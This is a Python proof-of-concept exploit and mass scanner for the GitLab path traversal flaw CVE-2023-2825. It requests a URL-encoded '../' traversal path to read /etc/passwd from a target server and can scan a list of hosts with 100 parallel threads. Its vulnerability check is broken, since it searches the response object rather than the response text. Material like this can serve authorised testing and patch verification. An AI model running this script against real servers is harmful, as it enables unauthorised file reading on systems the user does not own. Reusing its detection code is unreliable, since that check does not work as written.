#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """


 ____  _     _____      ____  ____  ____ _____        ____  ____  ____  ____ 
/   _\/ \ |\/  __/     /_   \/  _ \/_   \\__  \      /_   \/ ___\/_   \/ ___\
|  /  | | //|  \ _____  /   /| / \| /   /  /  |_____  /   /\ \ // /   /|    \
|  \__| \// |  /_\____\/   /_| \_/|/   /_ _\  |\____\/   /_/ /_\\/   /_\___ |
\____/\__/  \____\     \____/\____/\____//____/      \____/\____/\____/\____/
                                                                             

                                                            
                                             tag: gitlab路径遍历任意文件读取漏洞(CVE-2023-2825) poc                                       
                                                    @version: 1.0.0      @author: cy
"""
    print(test)

def poc(target):
    url = "http://"+target+"/group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    print(url)
    res = requests.get(url,headers=headers,verify=False,timeout=7)
    try:
        if "root" in res:
            print(f"[+] {target} is vulable!")
        else:
            print(f"[+] {target} is not vulable!")
    except:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description='An unauthenticated malicious user can use a path traversal vulnerability to read arbitrary files on the server when an attachment exists in a public project nested within at least five groups')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" url.txt include urls")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()